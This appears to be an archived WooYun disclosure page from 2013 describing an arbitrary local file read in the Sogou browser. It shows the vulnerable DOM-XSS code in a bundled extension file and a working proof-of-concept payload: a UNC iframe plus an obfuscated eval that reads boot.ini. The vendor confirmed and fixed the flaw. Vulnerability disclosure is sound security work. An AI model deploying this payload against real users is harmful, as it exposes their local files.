@@ -1,0 +1,206 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		搜狗浏览器任意文件读取漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		搜狗浏览器任意文件读取漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的胖子">心伤的胖子</a> 
+</li><li>提交时间：		2013-07-14 12:41</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-07-14：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-07-15：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-07-18：	细节向第三方安全合作伙伴开放<br/>
+									2013-07-25：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-08-04：	细节向普通白帽子公开<br/>
+									2013-08-24：	细节向实习白帽子公开<br/>
+									2013-10-12：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">搜狗浏览器对通过 UNC 访问 127.0.0.1 域限制一直比较宽松，之前就出现过本地文件存在 xss 漏洞，可以读取本地的任意文件的漏洞。结果是搜狗把本地文件的 xss 给修复，并没有对 UNC 访问 127.0.0.1 域做限制。<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">其实只要找个任意的本地文件的 xss 漏洞就可以通过该漏洞读取本地的任意文件。<br />
+<br />
+<br />
+<br />
+搜狗浏览器安装玩游戏插件后会把插件解压，解压后的文件夹下有如下的文件 <br />
+<br />
+<br />
+<br />
+C:\Documents and Settings\Administrator\Application Data\SogouExplorer\Extension\com.sogou.gamecenter\0.6.0\html\balloon.html<br />
+<br />
+<br />
+<br />
+该文件存在 dom xss 漏洞，如下代码，从 location.href 取数据没有经过处理直接 document.write 操作，造成 xss 漏洞。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;<br />
+	var paramStr=location.href.split(&quot;?&quot;)[1]<br />
+	var debugUrl=&quot;http://fanjinhui.sogou-inc.com/d/balloom.html?&quot;+paramStr<br />
+	var productUrl=&quot;http://wan.sogou.com/ad/gethtml.do?&quot;+paramStr<br />
+	var theUrl=debug?debugUrl:productUrl;<br />
+&lt;/script&gt;<br />
+&lt;script type=&quot;text/javascript&quot;&gt;			<br />
+	document.write(&#039;&lt;iframe src=&quot;&#039;+theUrl+&#039;&quot; id=&quot;ad-frame&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; width=&quot;294&quot; height=&quot;190&quot;&gt;&lt;/iframe&gt;&#039;)<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">在任意页面上构造如下代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;iframe width=100% height=100% src=&#039;\\127.0.0.1\c$/DOCUME~1/Administrator/Application Data/SogouExplorer/Extension/com.sogou.gamecenter/0.6.0/html/balloon.html?&quot;&gt;&lt;/iframe&gt;&lt;img src=a onerror=eval(unescape(unescape(&quot;xmlhttp%253Dnew%2520ActiveXObject%2528%2522Msxml2.XMLHTTP.3.0%2522%2529%253Bxmlhttp.open%2528%2522GET%2522%252C%2522file%253A////127.0.0.1/c%2524/boot.ini%2522%252Cfalse%2529%253Bxmlhttp.send%2528%2529%253Balert%2528xmlhttp.responseText%2529%253B&quot;)))&gt;&#039;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+就会读取本地的 boot.ini 文件，测试 xp sp3 / windows 2003 <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/14122454843c72db698d84c429e821cbaa271843.png" target="_blank"><img src="../images/14122454843c72db698d84c429e821cbaa271843.png" alt="sogou.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">限制 UNC 这种对 127.0.0.1 域的访问。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的胖子" title="心伤的胖子">心伤的胖子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-028832" title="搜狗浏览器任意文件读取漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-07-15 15:03</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">收到，感谢提供</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-10-12：确认已在新版本搜狗浏览器中修复此漏洞。</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="28832";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
